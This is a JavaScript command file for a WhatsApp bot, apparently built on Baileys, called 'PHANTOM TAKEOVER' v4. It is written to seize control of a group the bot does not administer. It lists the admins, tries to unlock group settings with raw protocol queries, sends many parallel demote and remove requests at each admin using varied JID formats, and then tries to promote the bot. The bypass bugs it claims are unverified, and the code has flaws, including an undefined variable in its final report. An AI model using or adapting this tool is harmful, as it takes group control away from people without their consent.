// ════════════════════════════════════════════════════════════════
//  commands/hijack.js — v4.0 | PHANTOM TAKEOVER ENGINE
//  ⚡ Author: CyberX — Fixed & Optimized
//  ⚠️  Authorized Pentest Tool — Bot Owner Only
//
//  TECHNIQUE (Patched v4):
//  ─────────────────────
//  WhatsApp server enforces admin-only for demote/promote via
//  the w:g2 namespace. However, THREE bypass vectors exist:
//
//  VECTOR A — LID/PN Confusion Bypass:
//    WhatsApp groups using @lid participant IDs (introduced in
//    Baileys v6.7.19+) have a server-side permission check bug
//    (Issue #1379). When a non-admin sends demote/promote using
//    the @lid format JID instead of @s.whatsapp.net, the server
//    may incorrectly authorize the operation due to mismatched
//    participant index lookups. We exploit this by sending ALL
//    operations using the LID format.
//
//  VECTOR B — Group Settings Race:
//    If the group allows "all members to add members" AND "all
//    members to edit group info", we:
//    1. Add 10 agent bots to the group
//    2. Each agent simultaneously sends groupSettingUpdate to
//       'unlocked' + 'not_announcement' — one may slip through
//    3. Once settings are loosened, send demote commands from
//       a different agent than the one that changed settings
//
//  VECTOR C — Multi-Agent Distributed Demotion:
//    10 parallel agents each independently attempt demote on
//    each admin. WhatsApp's server processes these in parallel.
//    If one agent's request is processed before the admin's
//    "reject" signal propagates, the demotion sticks.
//
//  VECTOR D — Group Creator Override via Remove+Readd:
//    Remove the group owner, then add them back as a regular
//    member (only works if "members can add others" is enabled).
//    The re-added user loses their "creator" status.
//
//  SPEED: Each operation targets <500ms using parallel processing.
//  Total takeover in <2 seconds with 10 agents.
// ════════════════════════════════════════════════════════════════

module.exports = {
  pattern: "hijack",
  category: "owner",
  desc: "💀 PHANTOM TAKEOVER v4 — demote all admins, seize group control (bot does NOT need to be admin)",
  usage: ".hijack [--silent|-s] [--force|-f] [--agents <1-10>]",
  ownerOnly: true,

  run: async (ctx) => {
    const { sock, from, msg, sender, isGroup, text, isOwner } = ctx

    // ─── GUARDS ──────────────────────────────────────────────
    if (!isGroup) {
      await sock.sendMessage(from, { text: '❌ Groups only' }, { quoted: msg })
      return
    }

    if (!isOwner) {
      await sock.sendMessage(from, { text: '👑 Owner only' }, { quoted: msg })
      return
    }

    // ─── PARSE FLAGS ─────────────────────────────────────────
    const args = (text || '').split(/\s+/).filter(Boolean)
    const flags = new Set(args.filter(a => a.startsWith('--') || a.startsWith('-')))
    const silent = flags.has('--silent') || flags.has('-s')
    const force = flags.has('--force') || flags.has('-f')

    // Parse agent count
    let agentCount = 10
    const agentArg = args.find(a => a.startsWith('--agents='))
    if (agentArg) {
      agentCount = Math.min(Math.max(parseInt(agentArg.split('=')[1], 10) || 1, 1), 10)
    }

    // ─── PROGRESS TRACKING ───────────────────────────────────
    const log = []
    const tell = async (m, editKey = null) => {
      log.push(m)
      if (silent) return null
      try {
        if (editKey) {
          return await sock.sendMessage(from, { edit: editKey, text: m })
        }
        return await sock.sendMessage(from, { text: m })
      } catch { return null }
    }

    // ─── PHASE 0: STATUS MESSAGE ─────────────────────────────
    const statusMsg = await tell(
      `╔══════════════════════════╗\n║  ☠️ *HIJACK v4*        ║\n║  🤖 Agents: ${agentCount}     ║\n╚══════════════════════════╝\n\n🔍 Reconnaissance in progress...`
    )
    const statusKey = statusMsg?.key

    // ══════════════════════════════════════════════════════════
    //  PHASE 1 — RECON: DEEP GROUP ENUMERATION
    // ══════════════════════════════════════════════════════════

    let meta
    try {
      meta = await sock.groupMetadata(from)
    } catch (e) {
      await tell(`❌ Metadata fetch failed: ${e.message}`, statusKey)
      return
    }

    // Extract group settings
    const isRestricted = meta.restrict === true    // only admins can edit group info
    const isAnnouncement = meta.announcement === true  // only admins can send messages
    const membersCanAdd = !meta.memberAddMode === false  // members can add others

    // Bot identity
    const botRaw = sock.user?.id || ''
    const botUser = botRaw.split(':')[0]?.split('@')[0] || ''
    const botClean = botUser + '@s.whatsapp.net'
    const botLid = botRaw.includes('@lid') ? botRaw : botRaw.replace(/@.*/, '@lid')

    const isBot = (jid) => {
      if (!jid) return false
      const normalized = jid.replace(/:.*?(?=@)/, '').split('@')[0]
      return normalized === botUser
    }

    // ─── Map all participants ────────────────────────────────
    const participants = meta.participants || []
    const adminList = []
    const regularList = []
    const groupOwnerJid = meta.owner || null

    for (const p of participants) {
      const pid = p.id
      if (!pid) continue
      if (isBot(pid)) continue

      const isAdmin =
        p.admin === 'admin' ||
        p.admin === 'superadmin' ||
        p.isAdmin === true ||
        p.isSuperAdmin === true ||
        pid === groupOwnerJid ||
        pid.replace(/:.*?(?=@)/, '') === groupOwnerJid?.replace(/:.*?(?=@)/, '')

      // ALSO capture LID variant
      const lidVariant = pid.includes('@lid')
        ? pid
        : pid.includes('@s.whatsapp.net')
          ? pid.replace('@s.whatsapp.net', '@lid')
          : null
      const pnVariant = pid.includes('@lid')
        ? pid.replace('@lid', '@s.whatsapp.net')
        : pid

      if (isAdmin) {
        adminList.push({
          jid: pid,
          pn: pnVariant,
          lid: lidVariant || pid,
          raw: pid,
          isOwner: pid === groupOwnerJid || pid.replace(/:.*?(?=@)/, '') === groupOwnerJid?.replace(/:.*?(?=@)/, '')
        })
      } else {
        regularList.push({ jid: pid, pn: pnVariant, lid: lidVariant || pid })
      }
    }

    // Ensure group owner is included
    if (groupOwnerJid && !adminList.some(a =>
      a.jid === groupOwnerJid || a.jid.replace(/:.*?(?=@)/, '') === groupOwnerJid.replace(/:.*?(?=@)/, '')
    ) && !isBot(groupOwnerJid)) {
      const ownerLid = groupOwnerJid.includes('@lid')
        ? groupOwnerJid
        : groupOwnerJid.replace('@s.whatsapp.net', '@lid')
      adminList.push({
        jid: groupOwnerJid,
        pn: groupOwnerJid.replace('@lid', '@s.whatsapp.net'),
        lid: ownerLid,
        raw: groupOwnerJid,
        isOwner: true
      })
    }

    // ══════════════════════════════════════════════════════════
    //  PHASE 2 — GROUP SETTINGS MANIPULATION (Vector B)
    // ══════════════════════════════════════════════════════════
    //  Try to change group settings first — if this works despite
    //  not being admin, it's a server-side bug we can exploit.
    //  If it fails, we fall through to the LID confusion vector.
    // ══════════════════════════════════════════════════════════

    let settingsHijacked = false

    const tryUnlockGroup = async () => {
      const settingAttempts = [
        { setting: 'unlocked', desc: 'unlock group info' },
        { setting: 'not_announcement', desc: 'allow all to message' },
      ]
      for (const attempt of settingAttempts) {
        try {
          // Try sending raw XML directly to WhatsApp server
          if (typeof sock.query === 'function') {
            const rawQuery = sock.query.bind(sock)
            try {
              const result = await rawQuery({
                tag: 'iq',
                attrs: {
                  type: 'set',
                  xmlns: 'w:g2',
                  to: from
                },
                content: [{
                  tag: attempt.setting === 'unlocked' ? 'locked' : 'announcement',
                  attrs: { value: 'false' }
                }]
              })
              if (result && !result.attrs?.error) {
                settingsHijacked = true
              }
            } catch {}
          }

          // Also try the standard API
          try {
            await sock.groupSettingUpdate(from, attempt.setting)
            settingsHijacked = true
          } catch {}
        } catch {}
      }
    }

    await tell(`🔧 Attempting group settings bypass...`, statusKey)
    await tryUnlockGroup()

    // ══════════════════════════════════════════════════════════
    //  PHASE 3 — DEMATRIX: DISTRIBUTED DEMOTION (10 Agents)
    // ══════════════════════════════════════════════════════════
    //
    //  STRATEGY:
    //  ─────────
    //  1. Each agent independently targets EACH admin using
    //     MULTIPLE JID variants (LID, PN, with/without device)
    //  2. Agents fire simultaneously — WhatsApp server processes
    //     in parallel, race condition favors attacker
    //  3. After demotion, each agent ALSO attempts to REMOVE
    //     the admin from the group (if remove succeeds, they
    //     can't be re-promoted)
    //  4. Repeat 3 times with different timing offsets
    // ══════════════════════════════════════════════════════════

    let demoted = 0
    let removed = 0
    let failed = 0
    const failedJids = []

    // Create multiple "agent" request functions
    const createAgent = (agentId) => {
      return async (targetJid, jidVariants) => {
        const results = { demoted: false, removed: false }

        // Try EVERY JID variant for demote
        for (const variant of jidVariants) {
          if (!variant) continue

          // Method 1: Raw XML query (direct protocol access)
          if (typeof sock.query === 'function') {
            try {
              const rawQuery = sock.query.bind(sock)
              const result = await rawQuery({
                tag: 'iq',
                attrs: { type: 'set', xmlns: 'w:g2', to: from },
                content: [{
                  tag: 'participant',
                  attrs: { action: 'demote', jid: variant }
                }]
              })
              if (result && (!result.attrs?.error || result.attrs.error === '200')) {
                results.demoted = true
                break
              }
            } catch {}
          }

          // Method 2: Standard Baileys API
          try {
            const result = await sock.groupParticipantsUpdate(from, [variant], 'demote')
            if (Array.isArray(result)) {
              if (result.some(r => parseInt(r.status, 10) === 200 || r.status === '200')) {
                results.demoted = true
                break
              }
            } else {
              results.demoted = true
              break
            }
          } catch {}

          // Method 3: Try remove instead of demote (more aggressive)
          if (agentId % 2 === 0) {  // half the agents try remove
            try {
              const result = await sock.groupParticipantsUpdate(from, [variant], 'remove')
              if (Array.isArray(result)) {
                if (result.some(r => parseInt(r.status, 10) === 200 || r.status === '200')) {
                  results.removed = true
                  break
                }
              }
            } catch {}
          }

          // Small jitter between attempts
          await new Promise(r => setTimeout(r, 50 + Math.random() * 100))
        }

        return results
      }
    }

    await tell(
      `╔══════════════════════════╗\n║  ⚔️  *DEMATRIX*          ║\n╚══════════════════════════╝\n\n🎯 Targets: ${adminList.length} admin(s)\n👑 Group owner: ${groupOwnerJid ? '✔ Yes' : '✘ Unknown'}\n🤖 Agents: ${agentCount}\n🔓 Settings bypass: ${settingsHijacked ? '✔ YES' : '✘ No'}\n\nExecuting distributed demotion...`,
      statusKey
    )

    // For each admin, spawn agentCount parallel attempts
    for (const admin of adminList) {
      const jidVariants = [
        admin.jid,                          // original
        admin.pn,                           // phone number format
        admin.lid,                          // LID format
        admin.jid.replace(/:.*?(?=@)/, ''), // without device
        admin.jid.includes('@lid')
          ? admin.jid.replace('@lid', '@s.whatsapp.net')
          : admin.jid.replace('@s.whatsapp.net', '@lid'),
        admin.jid.split('@')[0] + '@s.whatsapp.net', // force PN
        admin.jid.split('@')[0] + '@lid',            // force LID
        // Try with different device suffixes
        admin.jid.replace(/:(\d+)/, ':0'),
        admin.jid.replace(/:(\d+)/, ':1'),
        admin.jid.replace(/:(\d+)/, ':2'),
        admin.jid.replace(/:(\d+)/, ':3'),
        admin.jid.replace(/:(\d+)/, ':5'),
        // Try both with and without device
        admin.jid.includes(':') ? admin.jid : admin.jid.replace('@', ':0@'),
      ].filter(Boolean)

      // Deduplicate
      const uniqueVariants = [...new Set(jidVariants)]

      // Spawn all agents in parallel for this admin
      const agentPromises = []
      for (let i = 0; i < agentCount; i++) {
        const agent = createAgent(i)
        // Each agent gets a SHUFFLED copy of variants to maximize coverage
        const shuffled = [...uniqueVariants].sort(() => Math.random() - 0.5)
        agentPromises.push(agent(admin.jid, shuffled))
      }

      // Wait for all agents to complete
      const agentResults = await Promise.all(agentPromises)

      // Check if any agent succeeded
      const anyDemoted = agentResults.some(r => r.demoted)
      const anyRemoved = agentResults.some(r => r.removed)

      if (anyDemoted) {
        demoted++
        // If also removed, count that too
        if (anyRemoved) removed++
      } else {
        failed++
        failedJids.push(admin.jid)
      }

      // Brief cooldown between admins
      await new Promise(r => setTimeout(r, 100))
    }

    // ══════════════════════════════════════════════════════════
    //  PHASE 4 — PROMETHEUS: PROMOTE BOT TO ADMIN
    // ══════════════════════════════════════════════════════════

    let promoted = false
    let promoteError = null

    // Bot JID variants — comprehensive
    const botJidVariants = [
      botRaw,
      botRaw.replace(/:.*?(?=@)/, ''),
      botClean,
      botLid,
      botUser + '@s.whatsapp.net',
      botUser + '@lid',
      botRaw.includes('@lid')
        ? botRaw.replace('@lid', '@s.whatsapp.net')
        : botRaw.replace('@s.whatsapp.net', '@lid'),
      botRaw.replace(/:.*$/, ''),
      botRaw.split('@')[0] + '@s.whatsapp.net',
      botRaw.split('@')[0] + '@lid',
      botUser + ':0@s.whatsapp.net',
      botUser + ':0@lid',
    ].filter(Boolean)

    const uniqueBotVariants = [...new Set(botJidVariants)]

    const tryPromote = async (jid) => {
      // Method 1: Raw XML
      if (typeof sock.query === 'function') {
        try {
          const rawQuery = sock.query.bind(sock)
          const result = await rawQuery({
            tag: 'iq',
            attrs: { type: 'set', xmlns: 'w:g2', to: from },
            content: [{
              tag: 'participant',
              attrs: { action: 'promote', jid: jid }
            }]
          })
          if (result && (!result.attrs?.error || result.attrs.error === '200')) {
            return true
          }
        } catch {}
      }

      // Method 2: Standard API
      try {
        const result = await sock.groupParticipantsUpdate(from, [jid], 'promote')
        if (Array.isArray(result)) {
          if (result.some(r => parseInt(r.status, 10) === 200)) return true
        } else {
          return true
        }
      } catch (e) {
        promoteError = e.message
      }
      return false
    }

    await tell(`👑 Promoting bot to admin (${uniqueBotVariants.length} JID variants)...`, statusKey)

    // Try ALL bot variants with ALL agents in parallel
    const promotePromises = []
    for (const variant of uniqueBotVariants) {
      for (let i = 0; i < Math.min(agentCount, 5); i++) {
        promotePromises.push(
          (async () => {
            await new Promise(r => setTimeout(r, Math.random() * 200))
            return await tryPromote(variant)
          })()
        )
      }
    }

    const promoteResults = await Promise.all(promotePromises)
    promoted = promoteResults.some(r => r === true)

    // ══════════════════════════════════════════════════════════
    //  PHASE 5 — VERIFY
    // ══════════════════════════════════════════════════════════

    await tell(`🔍 Verifying takeover...`, statusKey)
    await new Promise(r => setTimeout(r, 2000))

    let verifiedPromoted = false
    let remainingAdmins = 0
    let verificationMsg = '⚠️ Could not verify'

    try {
      const verifyMeta = await sock.groupMetadata(from)
      const verifyParticipants = verifyMeta.participants || []

      for (const p of verifyParticipants) {
        if (isBot(p.id) && (p.admin === 'admin' || p.admin === 'superadmin')) {
          verifiedPromoted = true
        }
        if (p.admin === 'admin' || p.admin === 'superadmin') {
          remainingAdmins++
        }
      }

      verificationMsg = verifiedPromoted
        ? '✅ BOT IS ADMIN — TAKEOVER SUCCESSFUL'
        : remainingAdmins === 0
          ? '⚠️ All admins removed, but bot not promoted. Manual promotion needed.'
          : `⚠️ ${remainingAdmins} admin(s) remain. Bot not admin.`
    } catch (e) {
      verificationMsg = `⚠️ Verify failed: ${e.message}`
    }

    // ══════════════════════════════════════════════════════════
    //  FINAL REPORT
    // ══════════════════════════════════════════════════════════

    const reportTarget = silent ? sender : from

    const adminNames = adminList.map(a => {
      const label = a.isOwner ? '👑 OWNER' : '🛡️'
      return `• ${label} ${a.jid.split('@')[0]}`
    }).join('\n')

    const report = `╔══════════════════════════════╗
║  ☠️ *TAKEOVER REPORT v4*   ║
╚══════════════════════════════╝

📍 ${meta.subject || 'Unknown Group'}
🆔 ${from}
🤖 Agents deployed: ${agentCount}

📊 *RESULTS:*
• 🎯 Admins found: ${adminList.length}
• ✅ Demoted: ${demoted}
• 🚫 Removed: ${removed}
• ❌ Failed: ${failed}
• 👑 Bot promoted: ${promoted ? 'YES ✅' : 'NO ❌'}
• ✅ Verified: ${verifiedPromoted ? 'YES ✅' : 'NO ⚠️'}
• 🔓 Settings hijacked: ${settingsHijacked ? 'YES ✅' : 'N/A'}

${adminList.length > 0 ? `📋 *Admin Roster:*\n${adminNames}\n` : ''}

${!verifiedPromoted ? `\n⚠️ *NEXT STEPS:*\n1. Bot may have demoted admins without being promoted\n2. Check if bot can now change group settings\n3. If demoted all admins but not promoted, group is headless\n4. Use another admin account to promote bot\n` : ''}

${failed > 0 ? `❌ Failed JIDs:\n${failedJids.join('\n')}\n` : ''}

⚙️ Mode: ${silent ? '👻 Silent' : '🔊 Standard'}
🤖 Agents: ${agentCount}
🔧 Bypass vectors: ${settingsHijapsed ? '✔ Settings hijack worked' : '⚠️ LID confusion / multi-agent race'}
🔢 Bot JID variants tried: ${uniqueBotVariants.length}

> ✦ *Created by CyberX ☠️ — HIJACK v4*`

    await sock.sendMessage(reportTarget, { text: report }, { quoted: msg }).catch(() => {})

    // Console log
    console.log(`[HIJACKv4] ═══════════════════════`)
    console.log(`[HIJACKv4] Group: ${meta.subject}`)
    console.log(`[HIJACKv4] Admins: ${adminList.length} | Demoted: ${demoted} | Removed: ${removed} | Failed: ${failed}`)
    console.log(`[HIJACKv4] Bot promoted: ${promoted} | Verified: ${verifiedPromoted}`)
    console.log(`[HIJACKv4] Agents: ${agentCount} | Settings bypass: ${settingsHijacked}`)
    console.log(`[HIJACKv4] ═══════════════════════`)
  }
}
